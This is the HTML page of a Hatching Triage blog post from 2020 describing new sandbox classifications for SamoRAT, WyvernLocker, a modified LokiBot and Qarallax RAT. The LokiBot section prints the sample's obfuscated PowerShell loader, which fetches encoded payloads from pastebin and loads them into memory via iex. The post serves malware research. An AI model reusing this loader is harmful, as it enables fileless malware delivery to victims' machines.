@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta name="keywords" content="Hatching, Hatching Triage, Sandbox, Malware Analysis, Automated Malware Analysis">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="revisit-after" content="3 days">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@hatching_io">
+    <meta name="twitter:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta property="og:url" content="https://www.hatching.io">
+    <link rel="manifest" href="/static/manifest.json">
+    
+      <meta property="og:image" content="https://www.hatching.io/static/images/backgrounds/resized-14.jpg">
+      <meta name="twitter:image" content="https://www.hatching.io/static/images/backgrounds/resized-14.jpg">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-123677703-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-123677703-1');
+    </script>
+    <link rel="stylesheet" href="https://hatching.io/static/css/index.css?1726233262">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hatching.io/static/images/favicon-32x32.png?v=21">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hatching.io/static/images/favicon-16x16.png?v=21">
+    <title>Updated family classifications</title>
+  </head>
+  <body>
+<nav class="site-menu">
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+    <li><a href="/triage/">Triage</a></li>
+    <li><a class="active" href="/blog/">Blog</a></li>
+    <li><a  href="https://boards.greenhouse.io/recordedfuture" rel="nofollow">Jobs</a></li>
+    <li><a href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" target="_blank">Contact</a></li>
+  </ul>
+</nav>
+<header class="site-nav headroom ">
+  <div class="logo">
+    <a href="/">
+      <img width="210px" src="https://hatching.io/static/images/rf-hatching-black.svg" width="164">
+    </a>
+  </div>
+  <div>
+    <a href="#" class="toggle-menu">
+      Menu
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+  </div>
+</header>
+
+
+<section class="scheme-1 view-context blog-fold blog-article-head" id="fold" data-keep="true">
+  <div class="view-context__body">
+    <div>
+      <div>
+        
+          <h5>Triage Thursday</h5>
+        
+        <h2>Updated family classifications</h2>
+      </div>
+      <ul>
+        <li>Share this:</li>
+        <li class="social">
+          <a href="https://twitter.com/hatching_io" target="_blank">
+            <i class="icon-twitter"></i>
+          </a>
+          <a href="https://www.linkedin.com/company/hatching" target="_blank">
+            <i class="icon-linkedin"></i>
+          </a>
+          <a href="https://www.github.com/hatching" target="_blank">
+            <i class="icon-github"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <h1>Blog.</h1>
+    </div>
+  </div>
+  <div class="background-graphic">
+    
+      <div class="image" style="background-image: url('/static/images/backgrounds/resized-14.jpg');"></div>
+    
+  </div>
+</section>
+
+<article class="view-context blog-article">
+  <header class="blog-article-meta">
+    <div class="blog-article-general">
+      <p><time datetime="2020-08-20T00:00:00Z">2020-08-20</time></p>
+        
+          <ul class="blog-article-tags">
+            <li><p><a href="/blog/#category=triage">triage</a></p>
+          </ul>
+        
+    </div>
+    <div class="blog-article-author">
+      <div class="avatar">
+        <img src="/static/images/avatars/pete.svg" />
+      </div>
+      <div>
+        <h5>Written by <br />Pete Cowman</h5>
+      </div>
+    </div>
+  </header>
+  <section class="blog-article-body">
+    
+      <p>This week has seen no major feature releases, but has included a number of small changes to our signatures. In our update roundup this week, we take a quick look at improvements to classification for a few families which have come to our attention recently.</p>
+<ul>
+<li><a href="#samorat">SamoRAT</a></li>
+<li><a href="#wyvern">WyvernLocker</a></li>
+<li><a href="#lokibot">Lokibot</a></li>
+<li><a href="#qarallax">Qarallax RAT</a></li>
+</ul>
+<p>Stay tuned over the next couple of weeks for more feature releases!</p>
+<hr>
+<h3 id="samorat">SamoRAT</h3>
+<blockquote>
+<p>Example Analyses:</p>
+<ul>
+<li><a href="https://tria.ge/reports/200709-954vxj2xke/behavioral1">200709-954vxj2xke</a></li>
+<li><a href="https://tria.ge/reports/200709-fvcw7vfbyn/behavioral1">200709-fvcw7vfbyn</a></li>
+</ul>
+</blockquote>
+<p>SamoRAT is a .NET-based trojan which has seen use in the wild over the last couple of months. We observed some sample being submitted to Triage in July, and this week we have added some rules to classify this family automatically.</p>
+<p>SamoRAT doesn&rsquo;t make much effort to hide its identity. We can see some of the IoCs for it clearly in the Triage analysis as shown below.</p>
+<figure><img src="../../static/images/blog/tt-20-08-20/samorat-c2.png"><figcaption>
+      <h4>SamoRAT C2 Domain</h4>
+    </figcaption>
+</figure>
+
+<figure><img src="../../static/images/blog/tt-20-08-20/samorat-mutex.png"><figcaption>
+      <h4>SamoRAT creates a distinctive mutex on execution</h4>
+    </figcaption>
+</figure>
+
+<h3 id="wyvern">WyvernLocker</h3>
+<blockquote>
+<p>Example Analysis:</p>
+<ul>
+<li><a href="https://tria.ge/200727-xtrddn7znn/behavioral1">200727-xtrddn7znn</a></li>
+</ul>
+</blockquote>
+<p>WyvernLocker came to our attention at the end of July after the researcher <a href="https://twitter.com/GrujaRS">@GrujaRS</a> tweeted a sample. It appears to be a fairly standard ransomware, encrypting files with the predefined extension <code>.xienvkdoc</code>. We did not observe it dropping a ransomnote in our analyses, although some sources report that it drops a file to the desktop called <code>_READ_ME_.txt</code>.</p>
+<figure><img src="../../static/images/blog/tt-20-08-20/wyvernlocker.png">
+</figure>
+
+<h3 id="lokibot">LokiBot variant</h3>
+<blockquote>
+<p>Example Analysis:</p>
+<ul>
+<li><a href="https://tria.ge/200818-2h9kvp23px/behavioral1">200818-2h9kvp23px</a></li>
+</ul>
+</blockquote>
+<p>Earlier this week a Triage user sent us a sample which appears to be a cracked and modified version of the LokiBot trojan. It follows much the same pattern of infection and C2 communication as the &lsquo;standard&rsquo; LokiBot, but with many of the relevant paths and URLs modified.</p>
+<figure><img src="../../static/images/blog/tt-20-08-20/loki-c2.png"><figcaption>
+      <h4>POST request of &#39;standard&#39; LokiBot (left) vs modified sample (right)</h4>
+    </figcaption>
+</figure>
+
+<p>It uses a fileless PowerShell technique to launch the payload.</p>
+<figure><img src="../../static/images/blog/tt-20-08-20/loki-powershell.png"><figcaption>
+      <h4>PowerShell to download and decode an executable, then launch it directly</h4>
+    </figcaption>
+</figure>
+
+<p>It also features a slightly unusual &lsquo;job application&rsquo; which gets written to a registry run key&hellip;</p>
+<pre tabindex="0"><code>$fucksecurityresearchers=&#39;contactmeEX&#39;.replace(&#39;contactme&#39;,&#39;I&#39;);
+sal M $fucksecurityresearchers;
+do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);
+$KDASKDKAs = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);
+[System.Net.ServicePointManager]::SecurityProtocol = $KDASKDKAs;
+$iwannaleftsellingtools= New-Object -Com Microsoft.XMLHTTP;
+$iwannaleftsellingtools.open(&#39;GET&#39;,&#39;https://%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20@pastebin.com/raw/Qt1aSZRT&#39;,$false);
+$iwannaleftsellingtools.send();
+$ijijinjnini=$iwannaleftsellingtools.responseText;
+$asciiChars= $ijijinjnini -split &#39;-&#39; |ForEach-Object {[char][byte]\&#34;0x$_\&#34;};
+$asciiString= $asciiChars -join &#39;&#39;|M;
+[Byte[]]$Cli2= iex(iex(&#39;(&amp;(GCM *W-O*)&#39;+ &#39;Net.&#39;+&#39;WebC&#39;+&#39;lient)&#39;+&#39;.Dow&#39;+&#39;nload&#39;+&#39;Str&#39;+&#39;ing(&#39;&#39;https://%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20@pastebin.com/raw/sKp3S2gm&#39;&#39;).replace(&#39;&#39;/-(+)-\\&#39;&#39;,&#39;&#39;!@#*!&amp;@$**!@#&amp;!@#*@#*!@*#(!@#&amp;!@(#!@&amp;$(!@#&amp;!*@(#!&amp;@$*(!@#&amp;!*@(#!@&amp;#*(!@#&amp;!@*#()!@#&amp;!*@(#)&#39;&#39;).replace(&#39;&#39;!@#*!&amp;@$**!@#&amp;!@#*@#*!@*#(!@#&amp;!@(#!@&amp;$(!@#&amp;!*@(#!&amp;@$*(!@#&amp;!*@(#!@&amp;#*(!@#&amp;!@*#()!@#&amp;!*@(#)&#39;&#39;,&#39;&#39;0x&#39;&#39;)&#39;)) | g;
+$iwannaleftsellingtools=[System.Reflection.Assembly]::Load($decompressedByteArray);
+[rOnAlDo]::ChRiS(&#39;notepad.exe&#39;,$Cli2)
+</code></pre><h3 id="qarallax">Qarallax RAT</h3>
+<blockquote>
+<p>Example Analyses:</p>
+<ul>
+<li><a href="https://tria.ge/200806-lafzyx8wee/behavioral1">200806-lafzyx8wee</a></li>
+<li><a href="https://tria.ge/200806-k3ev8mxahj/behavioral1">200806-k3ev8mxahj</a></li>
+<li><a href="https://tria.ge/200806-c9796eyl5a/behavioral1">200806-c9796eyl5a</a></li>
+</ul>
+</blockquote>
+<p>Qarallax originated from an open source remote admin tool known as LaZagne, and has been around since 2016/17. It is still being seen in use in attacks in 2020. It is a full-featured stealer/trojan written in Java which can log keystrokes, take screenshots/webcam recordings, and harvest stored credentials from installed software such as browsers and email clients.</p>
+<figure><img src="../../static/images/blog/tt-20-08-20/qarallax-sigs.png">
+</figure>
+
+
+    
+  </section>
+</article>
+
+
+<section class="view-context blog-recommendations">
+  <article class="view-context__body">
+    <h2>You may also like:</h2>
+    
+    <ul>
+      
+        <li>
+          <h3>Ep. 146: Triage Thursday</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2024-08-29/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Extractor Updates and ZLoader Anti-VM</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2021-02-25/">Read</a>
+        </li>
+      
+        <li>
+          <h3>LimeRAT Extractor and Family Signature Additions</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2021-07-01/">Read</a>
+        </li>
+      
+        <li>
+          <h3>IQY malspam campaign</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/iqy-malspam/">Read</a>
+        </li>
+      
+    </ul>
+  </article>
+</section>
+    <footer class="scheme-4 view-context footer" id="contact">
+      <article class="view-context__body">
+        <h2>Want to know more?<br />Get in touch!</h2>
+        <a class="button button-variant-1" target="_blank" href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" i>Contact us</a>
+        <ul>
+          <li>
+            <ul>
+              <li class="logo"><img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="hatching"/></li>
+              <li class="social">
+                <a href="https://twitter.com/hatching_io" target="_blank">
+                  <i class="icon-twitter"></i>
+                </a>
+                <a href="https://www.linkedin.com/company/hatching" target="_blank">
+                  <i class="icon-linkedin"></i>
+                </a>
+                <a href="https://www.github.com/hatching" target="_blank">
+                  <i class="icon-github"></i>
+                </a>
+              </li>
+            </ul>
+          </li>
+          <li>
+            Hatching International B.V.<br />
+            The Netherlands<br/>
+            <br />
+            Email us: <a href="mailto:info@hatching.io">info@hatching.io</a>
+          </li>
+          <li>
+            IBAN: NL52 INGB 0006 9672 73<br />
+            BIC: INGBNL2A<br />
+            ING Groep N.V.<br />
+            Amsterdam-Zuidoost<br />
+            <br />
+            REG: 64146707<br />
+            VAT: NL855541891B01
+          </li>
+        </ul>
+      </article>
+      <div class="form hidden">
+        <div class="form-logo">
+          <img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="Hatching"/>
+        </div>
+        <a href="#" class="form-close" title="Close (or press esc)"></a>
+
+        <div class="container">
+          <h1>Contact us</h1>
+          <h3>Feel free to inquire or request about our services.</h3>
+          <form>
+            <fieldset>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-name" name="name" placeholder="Name" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-email" name="email" placeholder="Email" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-phone" name="phone" placeholder="Phone number" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-company" name="company" placeholder="Company" />
+                </div>
+              </div>
+            </fieldset>
+            <fieldset>
+              <div class="input required">
+                <textarea id="form-message" name="message" placeholder="Write a message"></textarea>
+              </div>
+              <div class="button-group">
+                <button type="reset" class="button button-variant-2 button-transparent">Reset</button>
+                <button type="submit" class="button button-variant-1">Send</button>
+              </div>
+            </fieldset>
+          </form>
+        </div>
+
+      </div>
+    </footer>
+    <script src="https://hatching.io/static/js/hatching.js?1726233262"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          if(window.main && window.main instanceof Function) {
+            window.main();
+          }
+          initForm();
+
+          
+          
+        });
+    </script>
+  </body>
+</html>
